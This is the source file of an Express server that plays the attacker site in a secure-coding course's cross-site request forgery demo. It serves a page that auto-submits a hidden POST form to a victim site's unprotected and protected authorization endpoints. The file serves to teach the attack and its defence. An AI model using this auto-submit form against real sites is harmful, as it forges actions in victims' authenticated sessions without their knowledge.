import express from "express"

// Some variables can be set as environment variables
ensureEnvVars("ATTACKER_PORT", "ATTACKER_HOST", "WEB_HOST", "WEB_PORT")
const attackerPort = process.env.ATTACKER_PORT
const attackerHost = process.env.ATTACKER_HOST
const webUrl = `https://${process.env.WEB_HOST}:${process.env.WEB_PORT}`
const app = express()

// Serve static files from the attackerfolder
app.use(express.static("attacker"))

// Helper function to render HTML responses
const renderResponse = (target, link) =>
  `<!doctype html>
<!--
     Demo page for Secure Coding in JavaScript

     PGCM - (c) 2025 - GPLv3

-->
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="attacker.css">
    <title>Attacker web site</title>
    <script>
     <!-- Note that the victim site is hardcoded here  -->
     const target = "${target}";
     // Execute function(s) after page has been loaded
     document.addEventListener("DOMContentLoaded", () => {
       document.forms[0].action = target;
       document.getElementById("target").textContent = target;
       setTimeout(function() {
         console.log("Auto submitting form");
         document.forms[0].submit()
       }, 5000);
     })
    </script>
  </head>
  <body>
    <center>
      <p>
        You are visiting a rogue web site, where a form would automatically have
        been submitted, without your knowledge.
      </p>
      <p>
        In this demo scenario, the form is auto submitted after 5 seconds to
      </p>
      <div id="target" class="target"></div>
    </center>
    <form method="POST">
      <input type="hidden" name="action" value="ROGUE-ACTION">
      <button type="submit">Submit manually</button>
    </form>
    ${link}
  </body>
</html>
`

app.get("/", (req, res) => {
  res.send(
    renderResponse(
      `${webUrl}/authorization`,
      '<a href="/protected">Try out the attack against the protected endpoint</a>',
    ),
  )
})

app.get("/protected", (req, res) => {
  res.send(
    renderResponse(
      `${webUrl}/authorization-protected`,
      '<a href="/">Try out the attack against the unprotected endpoint</a>',
    ),
  )
})

function ensureEnvVars(...vars) {
  vars.forEach((key) => {
    if (!process.env[key]) {
      console.error(`${key} not set as environment variable - is .env sourced?`)
      process.exit(1)
    }
  })
}

app.listen(attackerPort, () => {
  console.log(
    `Attacker web server running at http://${attackerHost}:${attackerPort}/`,
  )
  console.log(`Target site is ${webUrl}`)
})
